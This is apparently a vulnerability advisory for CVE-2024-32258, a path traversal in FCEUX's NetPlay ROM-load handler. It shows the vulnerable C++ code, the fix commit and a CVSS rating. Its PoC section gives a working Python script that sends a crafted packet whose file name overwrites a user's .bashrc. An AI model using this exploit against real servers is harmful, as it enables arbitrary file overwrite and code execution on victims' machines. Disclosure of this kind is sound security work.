## Overview

- **CVE ID**: [CVE-2024-32258](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-32258)
- **Type**: Path Traversal 
- **Vendor**: [FCEUX](https://fceux.com/)
- **Products**: FCEUX_NetPlay
- **Version**: 2.7.0
- **Fix**: [48b48e7c13be1b949074f42660a33c7ef57135e1](https://github.com/TASEmulators/fceux/pull/728/commits/48b48e7c13be1b949074f42660a33c7ef57135e1)

## Description

FCEUX is a NES Emulator that can take us back to our childhood. It provides multiple interesting features, such as two players being able to play games online. 

The server and client can pass ROMs to each other, but the server does not filter out special characters in the ROM names sent by the client. This path traversal vulnerability can cause any file on the server to be overwritten. Even more serious is that the remote loading of ROMs does not require authentication, even if the server settings require a password to log in.

It was introduced during commit [798c5a1d9c73b899cdbe3d613c0022588281979f](https://github.com/TASEmulators/fceux/commit/798c5a1d9c73b899cdbe3d613c0022588281979f) - *For NetPlay, added ability for client to request a ROM to load.*

```c++
if (acceptRomLoadReq)
{
    FILE *fp;
    std::string filepath = QDir::tempPath().toLocal8Bit().constData(); 
    const char *romData = &static_cast<const char*>(msgBuf)[ sizeof(netPlayLoadRomReq) ];

    filepath.append( "/" );
    filepath.append( msg->fileName );

    printf("Load ROM Request Received: %s\n", filepath.c_str());

    //printf("Dumping Temp Rom to: %s\n", filepath.c_str());
    fp = ::fopen( filepath.c_str(), "w");

    if (fp == nullptr)
    {
        return;
    }
    ::fwrite( romData, 1, msgSize, fp );
    ::fclose(fp);

    FCEU_WRAPPER_LOCK();
    LoadGame( filepath.c_str(), true, true );
    FCEUI_SetEmulationPaused(EMULATIONPAUSED_PAUSED);
    FCEU_WRAPPER_UNLOCK();

    resyncAllClients();
}
```

Both `msf->fileName` and `fp` are specified by the attacker.

## PoC

You can obtain fceux through source code compilation, or you can directly use our compiled binary. [fceux.zip](https://github.com/liyansong2018/CVE-2024-32258/files/15028161/fceux.zip)


PoC

```python
import socket
import binascii

client = socket.socket(family=socket.AF_INET, type=socket.SOCK_STREAM)
client.connect(('192.168.17.131', 4046))

header = "aa55aa55aa55aa550000000a00000204000000f0"
file_name = '../home/tom/.bashrc'
padding1 = '\0' * (256 - len(file_name))
nes_content = "gnome-calculator\n"
padding2 = '\0' * 0x100

client.send(binascii.unhexlify(header) + (file_name + padding1 + nes_content + padding2).encode())
res = client.recv(1024)
print(res)

packet = "0000000000000000000000000800450000641108400040062b8a7f0000017f000001cd340fcee511e70e3cfc427080180200fe5800000101080a94ee338594ee3382aa55aa55aa55aa5500000028000000300000000100000001000000000000000000000000000000000000000000000000"
client.send(binascii.unhexlify(packet))
res = client.recv(1024)
print(res)
```
Have fun! :smile:

https://github.com/liyansong2018/CVE-2024-32258/assets/25031216/2c237254-3ff8-4690-b0ea-d413f6e8c48d


## Severity

**High** 8.8 CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H

| CVSS3.1             | Score     | Detail                                            |
| ------------------- | --------- | ------------------------------------------------- |
| ATTACK VECTOR       | Network   | launch attack through the network                 |
| ATTACK COMPLEXITY   | Low       | just send two messages                            |
| PRIVILEGES REQUIRED | None      | no permissions are required to send attack packet |
| USER INTERACTION    | Require   | click the confirm button to load the ROM.         |
| SCOPE               | Unchanged | na                                                |
| CONFIDENTIALITY     | High      | arbitrary file overwrite                          |
| INTEGRITY           | High      | arbitrary file overwrite                          |
| AVAILABILITY        | High      | arbitrary file overwrite                          |

## Author
Yansong Li and Yijie Xun (Northwestern Polytechnical University)
